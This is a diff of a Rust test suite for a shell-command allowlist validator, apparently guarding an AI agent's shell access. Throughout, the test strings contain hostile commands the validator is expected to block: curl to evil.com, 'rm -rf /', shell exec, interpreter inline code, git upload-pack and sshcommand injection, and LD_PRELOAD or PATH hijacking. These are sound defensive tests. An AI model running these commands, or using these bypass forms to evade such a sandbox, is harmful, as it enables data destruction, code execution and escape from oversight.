@@ -58,13 +58,13 @@ fn allow(cmds: &[&str]) -> Vec<String> {
 
 #[test]
 fn allowlist_empty_always_passes() {
-    assert!(check_all_segments("anything", &[]).is_ok());
+    assert!(check_all_segments("anything", &[], ".").is_ok());
 }
 
 #[test]
 fn allowlist_blocks_unlisted() {
     let list = allow(&["git", "cargo"]);
-    let result = check_all_segments("npm install", &list);
+    let result = check_all_segments("npm install", &list, ".");
     assert!(result.is_err());
     assert!(result.unwrap_err().contains("npm"));
 }
@@ -76,7 +76,7 @@ fn allowlist_blocks_unlisted() {
 #[test]
 fn escaped_pipe_in_pattern_is_one_command() {
     let list = allow(&["rg"]);
-    assert!(check_all_segments(r"rg -n split\.label\|quantityLabel src/", &list).is_ok());
+    assert!(check_all_segments(r"rg -n split\.label\|quantityLabel src/", &list, ".").is_ok());
 }
 
 #[test]
@@ -85,26 +85,26 @@ fn escaped_semicolon_is_data() {
     // An escaped semicolon inside a regex pattern is data, not a separator —
     // the old scanner split here and blocked `bar` as an unknown command.
     // (`find -exec … \;` stays blocked separately via check_dangerous_flags.)
-    assert!(check_all_segments(r"rg foo\;bar src/", &list).is_ok());
+    assert!(check_all_segments(r"rg foo\;bar src/", &list, ".").is_ok());
 }
 
 #[test]
 fn escaped_ampersand_is_data() {
     let list = allow(&["rg"]);
-    assert!(check_all_segments(r"rg foo\&bar src/", &list).is_ok());
+    assert!(check_all_segments(r"rg foo\&bar src/", &list, ".").is_ok());
 }
 
 #[test]
 fn escaped_parens_in_pattern_keep_segment_intact() {
     let list = allow(&["rg"]);
-    assert!(check_all_segments(r"rg foo\(bar\|baz\) src/", &list).is_ok());
+    assert!(check_all_segments(r"rg foo\(bar\|baz\) src/", &list, ".").is_ok());
 }
 
 #[test]
 fn real_pipe_still_splits_after_escape_fix() {
     let list = allow(&["rg"]);
     // head is NOT allowlisted — a real pipe must still be validated per segment
-    let result = check_all_segments(r"rg -n split\.label src/ | head -5", &list);
+    let result = check_all_segments(r"rg -n split\.label src/ | head -5", &list, ".");
     assert!(result.is_err());
     assert!(result.unwrap_err().contains("head"));
 }
@@ -112,7 +112,7 @@ fn real_pipe_still_splits_after_escape_fix() {
 #[test]
 fn escaped_pipe_then_real_pipe_splits_correctly() {
     let list = allow(&["rg", "head"]);
-    assert!(check_all_segments(r"rg -n foo\|bar src/ | head -5", &list).is_ok());
+    assert!(check_all_segments(r"rg -n foo\|bar src/ | head -5", &list, ".").is_ok());
 }
 
 #[test]
@@ -130,34 +130,34 @@ fn escaped_dollar_paren_is_not_substitution() {
 #[test]
 fn trailing_backslash_does_not_panic_or_hang() {
     let list = allow(&["rg"]);
-    let _ = check_all_segments("rg foo\\", &list);
+    let _ = check_all_segments("rg foo\\", &list, ".");
     let _ = has_expanding_substitution_in_args("rg foo\\");
 }
 
 #[test]
 fn allowlist_allows_listed() {
     let list = allow(&["git", "cargo", "npm"]);
-    assert!(check_all_segments("git status", &list).is_ok());
-    assert!(check_all_segments("cargo test --release", &list).is_ok());
-    assert!(check_all_segments("npm run build", &list).is_ok());
+    assert!(check_all_segments("git status", &list, ".").is_ok());
+    assert!(check_all_segments("cargo test --release", &list, ".").is_ok());
+    assert!(check_all_segments("npm run build", &list, ".").is_ok());
 }
 
 #[test]
 fn allowlist_allows_full_path() {
     let list = allow(&["git"]);
-    assert!(check_all_segments("/usr/bin/git status", &list).is_ok());
+    assert!(check_all_segments("/usr/bin/git status", &list, ".").is_ok());
 }
 
 #[test]
 fn allowlist_allows_with_env_prefix() {
     let list = allow(&["git"]);
-    assert!(check_all_segments("LANG=C git log", &list).is_ok());
+    assert!(check_all_segments("LANG=C git log", &list, ".").is_ok());
 }
 
 #[test]
 fn allowlist_blocks_similar_names() {
     let list = allow(&["git"]);
-    assert!(check_all_segments("gitk --all", &list).is_err());
+    assert!(check_all_segments("gitk --all", &list, ".").is_err());
 }
 
 // --- Multi-segment validation (the critical security improvement) ---
@@ -166,36 +166,36 @@ fn allowlist_blocks_similar_names() {
 fn all_segments_must_be_allowed_chain() {
     let list = allow(&["git", "cargo"]);
     // Both allowed → ok
-    assert!(check_all_segments("git status && cargo test", &list).is_ok());
+    assert!(check_all_segments("git status && cargo test", &list, ".").is_ok());
     // Second not allowed → block
-    assert!(check_all_segments("git status && rm -rf /", &list).is_err());
+    assert!(check_all_segments("git status && rm -rf /", &list, ".").is_err());
 }
 
 #[test]
 fn all_segments_must_be_allowed_pipe() {
     let list = allow(&["git", "grep", "wc"]);
-    assert!(check_all_segments("git log | grep fix | wc -l", &list).is_ok());
+    assert!(check_all_segments("git log | grep fix | wc -l", &list, ".").is_ok());
     // cat not allowed
-    assert!(check_all_segments("git log | cat", &list).is_err());
+    assert!(check_all_segments("git log | cat", &list, ".").is_err());
 }
 
 #[test]
 fn all_segments_must_be_allowed_semicolon() {
     let list = allow(&["echo", "ls"]);
-    assert!(check_all_segments("echo hello; ls -la", &list).is_ok());
-    assert!(check_all_segments("echo hello; rm -rf /", &list).is_err());
+    assert!(check_all_segments("echo hello; ls -la", &list, ".").is_ok());
+    assert!(check_all_segments("echo hello; rm -rf /", &list, ".").is_err());
 }
 
 #[test]
 fn redirect_2to1_not_treated_as_command() {
     // #334: `2>&1` must not be parsed as a standalone command `1`.
     let list = allow(&["pnpm", "echo"]);
-    assert!(check_all_segments("pnpm run compile 2>&1", &list).is_ok());
-    assert!(check_all_segments("pnpm run build 2>&1 && echo done", &list).is_ok());
+    assert!(check_all_segments("pnpm run compile 2>&1", &list, ".").is_ok());
+    assert!(check_all_segments("pnpm run build 2>&1 && echo done", &list, ".").is_ok());
     // #384: exact reporter repros (3.6.26 predates the #334 fix) — pinned
     // through the full entry point, not just the segment splitter.
-    assert!(check_all_segments("echo test 2>&1", &list).is_ok());
-    assert!(check_all_segments("echo test 1>&2", &list).is_ok());
+    assert!(check_all_segments("echo test 2>&1", &list, ".").is_ok());
+    assert!(check_all_segments("echo test 1>&2", &list, ".").is_ok());
     assert_eq!(split_on_operators("echo test 2>&1").len(), 1);
     assert_eq!(split_on_operators("echo test 1>&2").len(), 1);
 }
@@ -203,10 +203,10 @@ fn redirect_2to1_not_treated_as_command() {
 #[test]
 fn redirect_ampersand_forms_not_separators() {
     let list = allow(&["cmd"]);
-    assert!(check_all_segments("cmd >&2", &list).is_ok()); // >&fd
-    assert!(check_all_segments("cmd 1>&2", &list).is_ok()); // N>&M
-    assert!(check_all_segments("cmd &>out.log", &list).is_ok()); // &>file
-    assert!(check_all_segments("cmd &>>out.log", &list).is_ok()); // &>>file
+    assert!(check_all_segments("cmd >&2", &list, ".").is_ok()); // >&fd
+    assert!(check_all_segments("cmd 1>&2", &list, ".").is_ok()); // N>&M
+    assert!(check_all_segments("cmd &>out.log", &list, ".").is_ok()); // &>file
+    assert!(check_all_segments("cmd &>>out.log", &list, ".").is_ok()); // &>>file
     // The redirect must not leak the fd/target as a new segment.
     assert_eq!(split_on_operators("pnpm run compile 2>&1").len(), 1);
     assert_eq!(split_on_operators("cmd &>out.log").len(), 1);
@@ -217,36 +217,36 @@ fn noclobber_redirect_not_a_pipe() {
     // #387: `>|` (noclobber redirect) must not split as a pipe — the target
     // is a file path, not a command to allowlist.
     let list = allow(&["date", "cmd"]);
-    assert!(check_all_segments("date >| out", &list).is_ok());
-    assert!(check_all_segments("cmd >>out", &list).is_ok());
-    assert!(check_all_segments("cmd > out", &list).is_ok());
+    assert!(check_all_segments("date >| out", &list, ".").is_ok());
+    assert!(check_all_segments("cmd >>out", &list, ".").is_ok());
+    assert!(check_all_segments("cmd > out", &list, ".").is_ok());
     // Exact reporter repros (both spellings of the fd-dup).
-    assert!(check_all_segments("date --fsdfs >| out 2>&1", &list).is_ok());
-    assert!(check_all_segments("date --fsdfs >| out 2>& 1", &list).is_ok());
-    assert!(check_all_segments("date --fsdfs > out 2>& 1", &list).is_ok());
+    assert!(check_all_segments("date --fsdfs >| out 2>&1", &list, ".").is_ok());
+    assert!(check_all_segments("date --fsdfs >| out 2>& 1", &list, ".").is_ok());
+    assert!(check_all_segments("date --fsdfs > out 2>& 1", &list, ".").is_ok());
     assert_eq!(split_on_operators("date >| out").len(), 1);
     assert_eq!(split_on_operators("date --fsdfs >| out 2>&1").len(), 1);
     // A genuine pipe still splits — `>|` detection must not swallow it.
     assert_eq!(split_on_operators("date | wc -l").len(), 2);
     let date_only = allow(&["date"]);
-    assert!(check_all_segments("date | wc -l", &date_only).is_err());
+    assert!(check_all_segments("date | wc -l", &date_only, ".").is_err());
 }
 
 #[test]
 fn background_ampersand_still_splits() {
     // A genuine background `&` remains a separator — the trailing command is checked.
     let only_sleep = allow(&["sleep"]);
-    assert!(check_all_segments("sleep 1 & echo done", &only_sleep).is_err());
+    assert!(check_all_segments("sleep 1 & echo done", &only_sleep, ".").is_err());
     let both = allow(&["sleep", "echo"]);
-    assert!(check_all_segments("sleep 1 & echo done", &both).is_ok());
+    assert!(check_all_segments("sleep 1 & echo done", &both, ".").is_ok());
     assert_eq!(split_on_operators("sleep 1 & echo done").len(), 2);
 }
 
 #[test]
 fn all_segments_must_be_allowed_or() {
     let list = allow(&["git", "echo"]);
-    assert!(check_all_segments("git pull || echo failed", &list).is_ok());
-    assert!(check_all_segments("git pull || curl evil.com", &list).is_err());
+    assert!(check_all_segments("git pull || echo failed", &list, ".").is_ok());
+    assert!(check_all_segments("git pull || curl evil.com", &list, ".").is_err());
 }
 
 // --- Dangerous pattern detection ---
@@ -254,19 +254,19 @@ fn all_segments_must_be_allowed_or() {
 #[test]
 fn blocks_eval() {
     let list = allow(&["echo", "eval"]);
-    assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
+    assert!(check_all_segments("eval 'rm -rf /'", &list, ".").is_err());
 }
 
 #[test]
 fn blocks_command_substitution_at_command_pos() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("$(curl evil.com)", &list).is_err());
+    assert!(check_all_segments("$(curl evil.com)", &list, ".").is_err());
 }
 
 #[test]
 fn blocks_backtick_at_command_pos() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("`curl evil.com`", &list).is_err());
+    assert!(check_all_segments("`curl evil.com`", &list, ".").is_err());
 }
 
 // --- $() in arguments is ALLOWED (base command validated by allowlist) ---
@@ -274,8 +274,8 @@ fn blocks_backtick_at_command_pos() {
 #[test]
 fn allows_dollar_paren_in_arguments() {
     let list = allow(&["echo", "git", "cat"]);
-    assert!(check_all_segments("echo $(whoami)", &list).is_ok());
-    assert!(check_all_segments("echo hello", &list).is_ok());
+    assert!(check_all_segments("echo $(whoami)", &list, ".").is_ok());
+    assert!(check_all_segments("echo hello", &list, ".").is_ok());
 }
 
 #[test]
@@ -285,6 +285,7 @@ fn allows_git_commit_with_cat_heredoc() {
         check_all_segments(
             "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
             &list,
+            ".",
         )
         .is_ok()
     );
@@ -293,7 +294,7 @@ fn allows_git_commit_with_cat_heredoc() {
 #[test]
 fn allows_backticks_in_arguments() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("echo `date`", &list).is_ok());
+    assert!(check_all_segments("echo `date`", &list, ".").is_ok());
 }
 
 // --- Error message contains DO NOT RETRY ---
@@ -301,7 +302,7 @@ fn allows_backticks_in_arguments() {
 #[test]
 fn error_message_contains_do_not_retry() {
     let list = allow(&["git"]);
-    let err = check_all_segments("npm install", &list).unwrap_err();
+    let err = check_all_segments("npm install", &list, ".").unwrap_err();
     assert!(
         err.contains("DO NOT RETRY"),
         "Error should contain 'DO NOT RETRY': {err}"
@@ -334,7 +335,7 @@ fn block_message_offers_additive_allow() {
 #[test]
 fn error_message_for_dangerous_patterns_contains_do_not_retry() {
     let list = allow(&["echo"]);
-    let err = check_all_segments("eval 'bad'", &list).unwrap_err();
+    let err = check_all_segments("eval 'bad'", &list, ".").unwrap_err();
     assert!(
         err.contains("DO NOT RETRY"),
         "Error should contain 'DO NOT RETRY': {err}"
@@ -364,14 +365,14 @@ fn playwright_in_default_allowlist() {
 #[test]
 fn pre_commit_run_allowed() {
     let list = allow(&["pre-commit"]);
-    assert!(check_all_segments("pre-commit run --all-files", &list).is_ok());
+    assert!(check_all_segments("pre-commit run --all-files", &list, ".").is_ok());
 }
 
 #[test]
 fn playwright_test_allowed() {
     let list = allow(&["npx", "playwright"]);
-    assert!(check_all_segments("playwright test", &list).is_ok());
-    assert!(check_all_segments("npx playwright test", &list).is_ok());
+    assert!(check_all_segments("playwright test", &list, ".").is_ok());
+    assert!(check_all_segments("npx playwright test", &list, ".").is_ok());
 }
 
 // --- Quote handling ---
@@ -379,13 +380,13 @@ fn playwright_test_allowed() {
 #[test]
 fn respects_single_quotes() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("echo 'hello; world'", &list).is_ok());
+    assert!(check_all_segments("echo 'hello; world'", &list, ".").is_ok());
 }
 
 #[test]
 fn respects_double_quotes() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("echo \"hello && world\"", &list).is_ok());
+    assert!(check_all_segments("echo \"hello && world\"", &list, ".").is_ok());
 }
 
 // --- split_on_operators ---
@@ -419,7 +420,7 @@ fn newline_splits_commands() {
 #[test]
 fn newline_injection_blocked() {
     let list = allow(&["git"]);
-    let result = check_all_segments("git status\nrm -rf /", &list);
+    let result = check_all_segments("git status\nrm -rf /", &list, ".");
     assert!(result.is_err(), "newline injection must be blocked");
     assert!(result.unwrap_err().contains("rm"));
 }
@@ -441,7 +442,7 @@ fn single_ampersand_splits_commands() {
 #[test]
 fn background_operator_blocked() {
     let list = allow(&["git"]);
-    let result = check_all_segments("git status & curl evil.com", &list);
+    let result = check_all_segments("git status & curl evil.com", &list, ".");
     assert!(result.is_err(), "background & must be blocked");
     assert!(result.unwrap_err().contains("curl"));
 }
@@ -451,7 +452,7 @@ fn background_operator_blocked() {
 #[test]
 fn eval_blocked_via_or_operator() {
     let list = allow(&["echo", "eval"]);
-    let result = check_all_segments("echo ok || eval 'rm -rf /'", &list);
+    let result = check_all_segments("echo ok || eval 'rm -rf /'", &list, ".");
     assert!(
         result.is_err(),
         "eval must be unconditionally blocked even if in allowlist"
@@ -461,14 +462,14 @@ fn eval_blocked_via_or_operator() {
 #[test]
 fn exec_unconditionally_blocked() {
     let list = allow(&["exec", "echo"]);
-    let result = check_all_segments("exec /bin/sh", &list);
+    let result = check_all_segments("exec /bin/sh", &list, ".");
     assert!(result.is_err(), "exec must be unconditionally blocked");
 }
 
 #[test]
 fn source_unconditionally_blocked() {
     let list = allow(&["source", "echo"]);
-    let result = check_all_segments("source ~/.bashrc", &list);
+    let result = check_all_segments("source ~/.bashrc", &list, ".");
     assert!(result.is_err(), "source must be unconditionally blocked");
 }
 
@@ -499,28 +500,28 @@ fn empty_allowlist_still_blocks_dollar_paren_at_start() {
 #[test]
 fn python_c_blocked() {
     let list = allow(&["python3"]);
-    let result = check_all_segments("python3 -c 'import os; os.system(\"id\")'", &list);
+    let result = check_all_segments("python3 -c 'import os; os.system(\"id\")'", &list, ".");
     assert!(result.is_err(), "python3 -c must be blocked");
 }
 
 #[test]
 fn node_e_blocked() {
     let list = allow(&["node"]);
-    let result = check_all_segments("node -e 'process.exit(1)'", &list);
+    let result = check_all_segments("node -e 'process.exit(1)'", &list, ".");
     assert!(result.is_err(), "node -e must be blocked");
 }
 
 #[test]
 fn python_script_allowed() {
     let list = allow(&["python3"]);
-    let result = check_all_segments("python3 script.py", &list);
+    let result = check_all_segments("python3 script.py", &list, ".");
     assert!(result.is_ok(), "python3 with script file must be allowed");
 }
 
 #[test]
 fn env_delegates_to_unlisted_blocked() {
     let list = allow(&["env", "git"]);
-    let result = check_all_segments("env /bin/sh -c 'id'", &list);
+    let result = check_all_segments("env /bin/sh -c 'id'", &list, ".");
     assert!(
         result.is_err(),
         "env delegating to unlisted command must be blocked"
@@ -577,9 +578,9 @@ fn gh391_delegation_wrappers_cannot_smuggle_inline_code() {
 #[test]
 fn gh391_xargs_delegation_respects_allowlist() {
     let list = allow(&["find", "xargs", "wc", "git"]);
-    assert!(check_all_segments("find . -name '*.rs' | xargs wc -l", &list).is_ok());
-    assert!(check_all_segments("xargs -n 1 git fetch", &list).is_ok());
-    let blocked = check_all_segments("find . -name '*.sh' | xargs rm", &list);
+    assert!(check_all_segments("find . -name '*.rs' | xargs wc -l", &list, ".").is_ok());
+    assert!(check_all_segments("xargs -n 1 git fetch", &list, ".").is_ok());
+    let blocked = check_all_segments("find . -name '*.sh' | xargs rm", &list, ".");
     assert!(
         blocked.is_err(),
         "xargs delegating to unlisted rm must be blocked"
@@ -619,7 +620,7 @@ fn gh391_strict_mode_blocks_pipe_to_bare_interpreter() {
 #[test]
 fn env_delegates_to_listed_allowed() {
     let list = allow(&["env", "git"]);
-    let result = check_all_segments("env git status", &list);
+    let result = check_all_segments("env git status", &list, ".");
     assert!(
         result.is_ok(),
         "env delegating to listed command must be allowed"
@@ -639,7 +640,7 @@ fn env_override_is_additive() {
 #[test]
 fn dot_source_alias_blocked() {
     let list = allow(&["echo"]);
-    let result = check_all_segments(". ~/.bashrc", &list);
+    let result = check_all_segments(". ~/.bashrc", &list, ".");
     assert!(result.is_err(), ". (source alias) must be blocked");
 }
 
@@ -659,7 +660,7 @@ fn backslash_newline_normalized() {
 #[test]
 fn delegation_recursive_interpreter_check() {
     let list = allow(&["env", "python3"]);
-    let result = check_all_segments("env python3 -c 'import os'", &list);
+    let result = check_all_segments("env python3 -c 'import os'", &list, ".");
     assert!(
         result.is_err(),
         "env python3 -c must be blocked via recursive check"
@@ -669,42 +670,42 @@ fn delegation_recursive_interpreter_check() {
 #[test]
 fn delegation_recursive_normal_allowed() {
     let list = allow(&["env", "git"]);
-    let result = check_all_segments("env git status", &list);
+    let result = check_all_segments("env git status", &list, ".");
     assert!(result.is_ok(), "env git status must be allowed");
 }
 
 #[test]
 fn eval_flags_extended_r() {
     let list = allow(&["php"]);
-    let result = check_all_segments("php -r 'system(\"id\")'", &list);
+    let result = check_all_segments("php -r 'system(\"id\")'", &list, ".");
     assert!(result.is_err(), "php -r must be blocked");
 }
 
 #[test]
 fn eval_flags_extended_p() {
     let list = allow(&["node"]);
-    let result = check_all_segments("node -p 'process.exit(1)'", &list);
+    let result = check_all_segments("node -p 'process.exit(1)'", &list, ".");
     assert!(result.is_err(), "node -p must be blocked");
 }
 
 #[test]
 fn combined_flags_pe_blocked() {
     let list = allow(&["perl"]);
-    let result = check_all_segments("perl -pe 's/foo/bar/'", &list);
+    let result = check_all_segments("perl -pe 's/foo/bar/'", &list, ".");
     assert!(result.is_err(), "perl -pe must be blocked (combined flag)");
 }
 
 #[test]
 fn combined_flags_ne_blocked() {
     let list = allow(&["perl"]);
-    let result = check_all_segments("perl -ne 'print'", &list);
+    let result = check_all_segments("perl -ne 'print'", &list, ".");
     assert!(result.is_err(), "perl -ne must be blocked (combined flag)");
 }
 
 #[test]
 fn heredoc_to_interpreter_blocked() {
     let list = allow(&["python3"]);
-    let result = check_all_segments("python3 <<'EOF'", &list);
+    let result = check_all_segments("python3 <<'EOF'", &list, ".");
     assert!(result.is_err(), "heredoc to interpreter must be blocked");
 }
 
@@ -713,7 +714,7 @@ fn heredoc_to_interpreter_blocked() {
 #[test]
 fn heredoc_block_message_names_the_workaround() {
     let list = allow(&["python3"]);
-    let err = check_all_segments("python3 - <<'PY'", &list).unwrap_err();
+    let err = check_all_segments("python3 - <<'PY'", &list, ".").unwrap_err();
     assert!(err.contains("[BLOCKED — DO NOT RETRY]"), "got: {err}");
     assert!(
         err.contains("python3 /tmp/snippet"),
@@ -728,8 +729,8 @@ fn heredoc_block_message_names_the_workaround() {
 #[test]
 fn python_script_file_still_allowed() {
     let list = allow(&["python3"]);
-    assert!(check_all_segments("python3 script.py", &list).is_ok());
-    assert!(check_all_segments("python3 -u script.py", &list).is_ok());
+    assert!(check_all_segments("python3 script.py", &list, ".").is_ok());
+    assert!(check_all_segments("python3 -u script.py", &list, ".").is_ok());
 }
 
 #[test]
@@ -746,7 +747,7 @@ fn bare_interpreter_detection() {
 fn dollar_paren_in_args_passes_by_default() {
     let list = allow(&["echo", "git", "cat"]);
     assert!(
-        check_all_segments("echo $(whoami)", &list).is_ok(),
+        check_all_segments("echo $(whoami)", &list, ".").is_ok(),
         "$() in args must still pass when shell_strict_mode=false (default)"
     );
 }
@@ -755,7 +756,7 @@ fn dollar_paren_in_args_passes_by_default() {
 fn backticks_in_args_passes_by_default() {
     let list = allow(&["echo"]);
     assert!(
-        check_all_segments("echo `date`", &list).is_ok(),
+        check_all_segments("echo `date`", &list, ".").is_ok(),
         "backticks in args must still pass when shell_strict_mode=false"
     );
 }
@@ -767,6 +768,7 @@ fn git_commit_with_subst_passes_by_default() {
         check_all_segments(
             "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
             &list,
+            ".",
         )
         .is_ok(),
         "git commit with $() must still pass (regression test)"
@@ -780,20 +782,20 @@ fn git_commit_with_subst_passes_by_default() {
 #[test]
 fn git_status_allowed() {
     let list = allow(&["git"]);
-    assert!(check_all_segments("git status", &list).is_ok());
+    assert!(check_all_segments("git status", &list, ".").is_ok());
 }
 
 #[test]
 fn git_upload_pack_blocked() {
     let list = allow(&["git"]);
-    let result = check_all_segments("git --upload-pack=\"evil\" clone repo", &list);
+    let result = check_all_segments("git --upload-pack=\"evil\" clone repo", &list, ".");
     assert!(result.is_err(), "git --upload-pack must be blocked");
 }
 
 #[test]
 fn git_config_sshcommand_blocked() {
     let list = allow(&["git"]);
-    let result = check_all_segments("git --config=core.sshcommand=\"evil\" clone repo", &list);
+    let result = check_all_segments("git --config=core.sshcommand=\"evil\" clone repo", &list, ".");
     assert!(
         result.is_err(),
         "git --config=core.sshcommand must be blocked"
@@ -803,53 +805,53 @@ fn git_config_sshcommand_blocked() {
 #[test]
 fn tar_extract_allowed() {
     let list = allow(&["tar"]);
-    assert!(check_all_segments("tar xf archive.tar", &list).is_ok());
+    assert!(check_all_segments("tar xf archive.tar", &list, ".").is_ok());
 }
 
 #[test]
 fn tar_to_command_blocked() {
     let list = allow(&["tar"]);
-    let result = check_all_segments("tar xf a.tar --to-command=evil", &list);
+    let result = check_all_segments("tar xf a.tar --to-command=evil", &list, ".");
     assert!(result.is_err(), "tar --to-command must be blocked");
 }
 
 #[test]
 fn find_name_allowed() {
     let list = allow(&["find"]);
-    assert!(check_all_segments("find . -name \"*.rs\"", &list).is_ok());
+    assert!(check_all_segments("find . -name \"*.rs\"", &list, ".").is_ok());
 }
 
 #[test]
 fn find_exec_blocked() {
     let list = allow(&["find"]);
-    let result = check_all_segments("find . -exec curl evil \\;", &list);
+    let result = check_all_segments("find . -exec curl evil \\;", &list, ".");
     assert!(result.is_err(), "find -exec must be blocked");
 }
 
 #[test]
 fn awk_system_blocked() {
     let list = allow(&["awk"]);
-    let result = check_all_segments("awk '{system(\"id\")}'", &list);
+    let result = check_all_segments("awk '{system(\"id\")}'", &list, ".");
     assert!(result.is_err(), "awk system() must be blocked");
 }
 
 #[test]
 fn awk_normal_allowed() {
     let list = allow(&["awk"]);
-    assert!(check_all_segments("awk '{print $1}'", &list).is_ok());
+    assert!(check_all_segments("awk '{print $1}'", &list, ".").is_ok());
 }
 
 #[test]
 fn inline_path_env_blocked() {
     let list = allow(&["git"]);
-    let result = check_all_segments("PATH=/tmp/evil git status", &list);
+    let result = check_all_segments("PATH=/tmp/evil git status", &list, ".");
     assert!(result.is_err(), "PATH= inline env must be blocked");
 }
 
 #[test]
 fn inline_ld_preload_blocked() {
     let list = allow(&["ls"]);
-    let result = check_all_segments("LD_PRELOAD=/tmp/evil.so ls", &list);
+    let result = check_all_segments("LD_PRELOAD=/tmp/evil.so ls", &list, ".");
     assert!(result.is_err(), "LD_PRELOAD= inline env must be blocked");
 }
 
@@ -857,7 +859,7 @@ fn inline_ld_preload_blocked() {
 fn echo_path_in_quotes_allowed() {
     let list = allow(&["echo"]);
     assert!(
-        check_all_segments("echo \"PATH=test\"", &list).is_ok(),
+        check_all_segments("echo \"PATH=test\"", &list, ".").is_ok(),
         "PATH inside quotes is not an inline env assignment"
     );
 }
@@ -1000,14 +1002,14 @@ fn extract_base_quoted_path() {
 #[test]
 fn interpreter_check_with_quoted_path() {
     let list = allow(&["python3"]);
-    let r = check_all_segments(r#"python3 "/path/with spaces/script.py""#, &list);
+    let r = check_all_segments(r#"python3 "/path/with spaces/script.py""#, &list, ".");
     assert!(r.is_ok(), "quoted path to script should be allowed");
 }
 
 #[test]
 fn dangerous_flags_git_quoted_path() {
     let list = allow(&["git"]);
-    let r = check_all_segments(r#"git -C "C:\Program Files\repo" status"#, &list);
+    let r = check_all_segments(r#"git -C "C:\Program Files\repo" status"#, &list, ".");
     assert!(r.is_ok(), "git -C with quoted path should be allowed");
 }
 
@@ -1020,50 +1022,50 @@ fn dangerous_flags_git_quoted_path() {
 #[test]
 fn for_loop_with_allowed_body_passes() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("for i in a b c; do echo $i; done", &list).is_ok());
+    assert!(check_all_segments("for i in a b c; do echo $i; done", &list, ".").is_ok());
 }
 
 #[test]
 fn while_loop_with_allowed_body_passes() {
     let list = allow(&["read", "echo"]);
-    assert!(check_all_segments("while read l; do echo $l; done", &list).is_ok());
+    assert!(check_all_segments("while read l; do echo $l; done", &list, ".").is_ok());
 }
 
 #[test]
 fn if_then_else_fi_with_allowed_commands_passes() {
     let list = allow(&["test", "cat", "echo"]);
-    assert!(check_all_segments("if test -f x; then cat x; else echo no; fi", &list).is_ok());
+    assert!(check_all_segments("if test -f x; then cat x; else echo no; fi", &list, ".").is_ok());
 }
 
 #[test]
 fn until_loop_with_allowed_body_passes() {
     let list = allow(&["test", "sleep"]);
-    assert!(check_all_segments("until test -f done; do sleep 1; done", &list).is_ok());
+    assert!(check_all_segments("until test -f done; do sleep 1; done", &list, ".").is_ok());
 }
 
 #[test]
 fn subshell_single_command_passes() {
     // The exact pain reported on #462: a one-command subshell.
     let list = allow(&["head"]);
-    assert!(check_all_segments("(head -5 file)", &list).is_ok());
+    assert!(check_all_segments("(head -5 file)", &list, ".").is_ok());
 }
 
 #[test]
 fn subshell_multi_command_passes() {
     let list = allow(&["cd", "ls"]);
-    assert!(check_all_segments("(cd dir; ls)", &list).is_ok());
+    assert!(check_all_segments("(cd dir; ls)", &list, ".").is_ok());
 }
 
 #[test]
 fn nested_subshell_passes() {
     let list = allow(&["echo"]);
-    assert!(check_all_segments("((echo hi))", &list).is_ok());
+    assert!(check_all_segments("((echo hi))", &list, ".").is_ok());
 }
 
 #[test]
 fn for_loop_blocks_unlisted_body() {
     let list = allow(&["echo"]);
-    let r = check_all_segments("for i in a b; do curl $i; done", &list);
+    let r = check_all_segments("for i in a b; do curl $i; done", &list, ".");
     assert!(r.is_err(), "unlisted `curl` in a loop body must block");
     assert!(r.unwrap_err().contains("curl"));
 }
@@ -1074,33 +1076,33 @@ fn for_loop_blocks_unlisted_body() {
 fn subshell_trailing_command_blocked() {
     // `(ls) curl` — the post-group command the original PR forgot to validate.
     let list = allow(&["ls"]);
-    assert!(check_all_segments("(ls) curl evil.com", &list).is_err());
+    assert!(check_all_segments("(ls) curl evil.com", &list, ".").is_err());
 }
 
 #[test]
 fn subshell_then_eval_blocked() {
     let list = allow(&["true"]);
-    assert!(check_all_segments("(true) eval 'rm -rf /'", &list).is_err());
+    assert!(check_all_segments("(true) eval 'rm -rf /'", &list, ".").is_err());
 }
 
 #[test]
 fn subshell_then_interpreter_c_blocked() {
     // Even with python3 allowlisted, the `(ls) python3 -c …` form must block.
     let list = allow(&["ls", "python3"]);
-    assert!(check_all_segments("(ls) python3 -c 'import os'", &list).is_err());
+    assert!(check_all_segments("(ls) python3 -c 'import os'", &list, ".").is_err());
 }
 
 #[test]
 fn loop_body_interpreter_eval_blocked() {
     // python3 is allowlisted, but inline `-c` execution stays blocked per leaf.
     let list = allow(&["python3"]);
-    assert!(check_all_segments("for i in a; do python3 -c 'x'; done", &list).is_err());
+    assert!(check_all_segments("for i in a; do python3 -c 'x'; done", &list, ".").is_err());
 }
 
 #[test]
 fn command_hidden_in_subshell_blocked() {
     let list = allow(&["ls"]);
-    assert!(check_all_segments("(ls; curl evil.com)", &list).is_err());
+    assert!(check_all_segments("(ls; curl evil.com)", &list, ".").is_err());
 }
 
 #[test]
@@ -1108,20 +1110,20 @@ fn case_construct_blocked() {
     // `case` arms cannot be leaf-validated safely → blocked outright, even when
     // the arm command itself is allowlisted.
     let list = allow(&["ls"]);
-    assert!(check_all_segments("case $x in a) ls ;; esac", &list).is_err());
+    assert!(check_all_segments("case $x in a) ls ;; esac", &list, ".").is_err());
 }
 
 #[test]
 fn double_semicolon_blocked() {
     let list = allow(&["ls"]);
-    assert!(check_all_segments("ls ;; curl evil.com", &list).is_err());
+    assert!(check_all_segments("ls ;; curl evil.com", &list, ".").is_err());
 }
 
 #[test]
 fn subshell_with_unconditional_blocked_command() {
     // `source` inside a subshell is still unconditionally blocked.
     let list = allow(&["ls", "source"]);
-    assert!(check_all_segments("(ls; source evil.sh)", &list).is_err());
+    assert!(check_all_segments("(ls; source evil.sh)", &list, ".").is_err());
 }
 
 #[test]
@@ -1129,7 +1131,7 @@ fn loop_header_substitution_is_not_a_bypass() {
     // A `$(…)` in a for-header is a command substitution; the leaf walker leaves
     // the header as data, but the body's unlisted command still blocks.
     let list = allow(&["echo"]);
-    assert!(check_all_segments("for i in $(ls); do curl $i; done", &list).is_err());
+    assert!(check_all_segments("for i in $(ls); do curl $i; done", &list, ".").is_err());
 }
 
 // --- Shell-security mode dispatcher (GL #788) ---
@@ -1208,7 +1210,7 @@ fn passes_enforced_is_mode_independent() {
 fn gh760_find_with_lib_path_segment_not_blocked() {
